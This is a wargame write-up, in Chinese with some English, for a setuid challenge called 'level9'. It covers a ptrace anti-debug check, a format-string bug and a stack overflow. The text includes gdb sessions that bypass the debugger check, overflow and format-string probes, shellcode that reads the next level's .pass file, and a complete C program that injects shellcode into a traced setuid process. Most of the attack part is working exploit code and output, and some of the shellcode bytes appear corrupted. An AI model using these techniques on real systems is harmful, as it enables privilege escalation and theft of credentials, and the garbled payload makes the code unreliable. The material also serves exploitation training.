level9

/* written by Level */
#include <string.h>
#include <stdio.h>
#include <sys/ptrace.h>

int main(int argc, char **argv) {
        if (ptrace(PTRACE_TRACEME,  0, 1, 0) < 0) {
                char buffer[128];
                strncpy(buffer,argv[1],sizeof(buffer));
                printf(buffer);            (字符串格式化漏洞)
        }
        else {
                char buffer[256];
                strcpy(buffer,argv[1]);    (溢出漏洞)
                printf("%s\n",buffer);
        }
}

gdb绕过调试检测 : gdb动态修改ptrace的返回值(返回值一般保存在eax中)，修改为0，
这样就可以绕过调试了，进入else分支

(gdb) disass main
Dump of assembler code for function main:
0x08048444 <main+0>:    lea    0x4(%esp),%ecx
0x08048448 <main+4>:    and    $0xfffffff0,%esp
0x0804844b <main+7>:    pushl  -0x4(%ecx)
0x0804844e <main+10>:   push   %ebp
0x0804844f <main+11>:   mov    %esp,%ebp
0x08048451 <main+13>:   push   %ecx
0x08048452 <main+14>:   sub    $0x114,%esp
0x08048458 <main+20>:   mov    %ecx,-0x108(%ebp)
0x0804845e <main+26>:   movl   $0x0,0xc(%esp)
0x08048466 <main+34>:   movl   $0x1,0x8(%esp)
0x0804846e <main+42>:   movl   $0x0,0x4(%esp)
0x08048476 <main+50>:   movl   $0x0,(%esp)
0x0804847d <main+57>:   call   0x804830c <ptrace@plt>
0x08048482 <main+62>:   test   %eax,%eax
0x08048484 <main+64>:   jns    0x80484be <main+122>
0x08048486 <main+66>:   mov    -0x108(%ebp),%edx
0x0804848c <main+72>:   mov    0x4(%edx),%eax
0x0804848f <main+75>:   add    $0x4,%eax
0x08048492 <main+78>:   mov    (%eax),%eax
0x08048494 <main+80>:   movl   $0x80,0x8(%esp)
0x0804849c <main+88>:   mov    %eax,0x4(%esp)
0x080484a0 <main+92>:   lea    -0x104(%ebp),%eax
0x080484a6 <main+98>:   mov    %eax,(%esp)
0x080484a9 <main+101>:  call   0x804831c <strncpy@plt>
0x080484ae <main+106>:  lea    -0x104(%ebp),%eax
0x080484b4 <main+112>:  mov    %eax,(%esp)
0x080484b7 <main+115>:  call   0x804834c <printf@plt>
0x080484bc <main+120>:  jmp    0x80484ec <main+168>
0x080484be <main+122>:  mov    -0x108(%ebp),%edx
0x080484c4 <main+128>:  mov    0x4(%edx),%eax
0x080484c7 <main+131>:  add    $0x4,%eax
0x080484ca <main+134>:  mov    (%eax),%eax
0x080484cc <main+136>:  mov    %eax,0x4(%esp)
0x080484d0 <main+140>:  lea    -0x104(%ebp),%eax
0x080484d6 <main+146>:  mov    %eax,(%esp)
0x080484d9 <main+149>:  call   0x804833c <strcpy@plt>
0x080484de <main+154>:  lea    -0x104(%ebp),%eax
0x080484e4 <main+160>:  mov    %eax,(%esp)
0x080484e7 <main+163>:  call   0x804835c <puts@plt>
0x080484ec <main+168>:  add    $0x114,%esp
0x080484f2 <main+174>:  pop    %ecx
---Type <return> to continue, or q <return> to quit---
0x080484f3 <main+175>:  pop    %ebp
0x080484f4 <main+176>:  lea    -0x4(%ecx),%esp
0x080484f7 <main+179>:  ret    
End of assembler dump.
(gdb) 

(gdb) r $(perl -e 'print"A"x(256)."BBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/level9/level9 $(perl -e 'print"A"x(256)."BBBB"')

Breakpoint 1, 0x08048482 in main ()
(gdb) set $eax=1
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
.........BBBB

Breakpoint 2, 0x080484f7 in main ()
(gdb) x/x $esp
0x4242423e:     Cannot access memory at address 0x4242423e
(gdb) 


[level9@logic level9]$ ./level9 $(perl -e 'print"A"x(255)')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
.......
[level9@logic level9]$ ./level9 $(perl -e 'print"A"x(256)')   
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
..........

[13]+  Stopped                 ./level9 $(perl -e 'print"A"x(256)')  

上面两个例子说明输入串长度大于等于256时就执行的进程就被Stop了，下面考虑字符串格式化
漏洞

(gdb) r $(perl -e 'print "AAAA"."[%08x]"x(10)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/level9/level9 $(perl -e 'print "AAAA"."[%08x]"x(10)')

AAAA[bfffdb9d][00000040][00000000][bfffd9e0][41414141][3830255b][255b5d78][5d783830][3830255b][255b5d78]
Program exited with code 0150.
(gdb)
由上面可得offset = 5

读取文件的shellcode
export PAYLOAD=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01
\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3
\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/level9/.pass




[level9@logic level9]$ gdb 

Finally, we needed a shellcode. We could not use a execve("/bin/sh"...) s
hellcode because the ptrace call prevented us from calling execve.

 PTRACE_TRACEME Indicates that this process is to be traced by its parent.
 Any signal (except SIGKILL) delivered to this process will cause it to stop 
 and its parent to be notified via wait(2). Also, all subsequent calls to 
 execve(2) by this process will cause a SIGTRAP to be sent to it, giving the 
 parent a chance to gain control before the new program begins execution. A 
 process probably shouldn't make this request if its parent isn't expecting 
 to trace it. (pid, addr, and data are ignored.)

1. 想法1，利用LD_PRELOAD加载一个自己的动态库替换掉ptrace函数，让它返回-1，从而可以利用
字符串格式化漏洞，但是setuid的程序都不会加载用户自定义的动态库：
[level9@logic level9]$ /levels/level9/level9 $(perl -e 'print "AAAA"."[%08x]"x(10)') (该level9程序拥有者为level10,是一个setuid的程序)
AAAA[%08x][%08x][%08x][%08x][%08x][%08x][%08x][%08x][%08x][%08x]
[level9@logic level9]$ 

[level9@logic level9]$ ./level9 $(perl -e 'print "AAAA"."[%08x]"x(10)')        (该level9程序拥有者为level9)      
AAAA[bfffdbed][00000040][00000000][bfffda50][41414141][3830255b][255b5d78]
[5d783830][3830255b][255b5d78]
[level9@logic level9]$ 

2. 我们自己来处理ptrace(PTRACE_TRACEME,0,0,0)

#include <sys/ptrace.h>
#include <sys/fcntl.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

void traphdl(int s) {
  printf("TRAP caught.\n");
}

int main(int an, char **ac, char **environ) {
  char shellcode[] = "\xc2\x90\xc2\x90\xc2\x90\xc2\x90\xc2\x90\x31\xc3\x80\xc2\x99\xc2\xb0\x05\x68\x43\x54\x46\x00\x68\x2e\x73\x6d\x70\xc2\x89\xc3\xa3\x31\xc3\x89\xc3\x8d\xc2\x80\xc2\x89\xc3\x86\xc2\x89\xc3\x90\xc2\xb0\x03\xc2\x89\xc3\xb3\xc2\x89\xc3\xa1\xc2\xb2\x60\xc3\x8d\xc2\x80\x31\xc3\x80\xc2\xb0\x04\x31\xc3\x9b\xc3\x8d\xc2\x80";
  int f;

  signal(SIGTRAP, traphdl);
  f = fork();
  if (f == 0) {
    int g = open("/tmp/.hesso/flagX", O_TRUNC|O_RDWR, 0666);
    dup2(g, 1);
    dup2(g, 2);
    char *X[2] = { "/usr/smp/challenge9/challenge9", NULL };
    execve(X[0], X, environ);
    return 255;
  } else if (f > 0) {
    int W = 0, S;
    sleep(2);
    kill(f, SIGCHLD);  /* 向子进程发送信号，从而让子进程停止执行，并向父进程发送消息，从而被跟踪 */
    while (W == 0 || errno != ECHILD) {
      errno = 0;
      W = waitpid(f, &S, 0);
      if (W == f && WIFSTOPPED(S) && WSTOPSIG(S) == SIGCHLD) {
        struct user_regs_struct U;
        unsigned long p, p2, pE;

        memset(&U, 0, sizeof(U));
        ptrace(PTRACE_GETREGS, f, 0, &U);
        fprintf(stderr, "EIP/EBP/ESP: %p / %p / %p\n", U.eip, U.ebp, U.esp);

        for (p = U.ebp; p; ) {
          p2 = ptrace(PTRACE_PEEKDATA, f, p, 0);
          pE = ptrace(PTRACE_PEEKDATA, f, p+4, 0);
          fprintf(stderr, "EBP at %p has %p, r-eip %p\n", p, p2, pE);
          p = p2;
          if ((pE & 0xfff) == 0x930) {
            break;
          }
        }

        // RWX memory at (p)

        for (p2 = 0; p2 < sizeof(shellcode); p2 += 4) {
          ptrace(PTRACE_POKEDATA, f, p + p2, *(long *)(shellcode + p2));
        }
        for (p2 = 0; p2 < 40; p2 += 4) {
          fprintf(stderr, "Stack frame at %p: %8.8x\n", p+p2, ptrace(PTRACE_PEEKDATA, f, p+p2, 0));
        }

        U.eip = p+2;
        U.esp = U.eip + 150;
        ptrace(PTRACE_SETREGS, f, 0, &U);
        ptrace(PTRACE_GETREGS, f, 0, &U);
        fprintf(stderr, "EIP before/after: %p\n", U.eip);

        while (1) {
          ptrace(PTRACE_SINGLESTEP, f, 0, 0);
          (void)waitpid(f, &S, 0);
          ptrace(PTRACE_GETREGS, f, 0, &U);
          printf("Now at %p\n", U.eip);
          usleep(100000);
        }

        ptrace(PTRACE_DETACH, f, 0, 0);
      } else if (W == f) {
        ptrace(PTRACE_DETACH, f, 0, 0);
      }
    }
  }

  return 0;
}